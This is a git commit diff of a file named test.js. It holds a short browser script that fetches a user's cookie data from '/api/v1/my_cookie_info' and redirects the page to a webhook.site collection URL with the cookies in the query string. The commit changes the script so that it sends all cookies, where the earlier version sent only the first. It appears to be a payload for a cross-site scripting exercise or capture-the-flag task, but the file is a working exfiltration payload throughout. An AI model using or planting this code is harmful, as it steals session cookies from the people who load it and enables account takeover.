49facca520eaa292f7bccb9e689fadd50bd4a77e
wldldlq <smjy01@gmail.com>
2024-10-14 19:22:55 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,7 +1,7 @@
 fetch("/api/v1/my_cookie_info")
     .then((response) => response.json())
     .then((data) => {
-        
-        var cookie = data.cookies[0];
-        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(cookie);
-    });
+        var allCookies = JSON.stringify(data.cookies);
+
+        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(allCookies);
+    })
